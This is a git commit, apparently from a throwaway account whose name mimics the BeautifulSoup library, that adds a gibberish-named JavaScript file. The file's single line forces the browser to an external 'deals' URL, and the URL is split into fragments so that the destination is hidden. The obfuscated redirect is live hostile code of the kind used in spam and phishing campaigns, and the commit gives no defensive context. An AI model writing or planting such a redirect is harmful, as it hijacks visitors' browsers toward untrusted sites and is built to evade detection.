f97b5f011c4c68162f6316381ddadb7d89edf573
beautifulsoupz <77855946+crossrevicerszedorton@users.noreply.github.com>
2022-12-29 20:28:57 +0100

    Create hkjfhkwjfehkjgfkqgkqgkqgdkqjgdqkgdjqgyfhgdfhdgdsx.js

---
+++ hkjfhkwjfehkjgfkqgkqgkqgdkqjgdqkgdjqgyfhgdfhdgdsx.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps:`,`//www.d`,`etail`,`onli`,`nedeals.co`,`m/I8cP`,`duJN7RUsHK8h`,`W-vvIEZyyyoTbuTg`,`Ow3zpUjQ3Qzp2`,`YblH1TWHd`,`kdOtmCYf2`,`M5j-yV7w9VUiJx`,`xQXYT6_sw~~`))
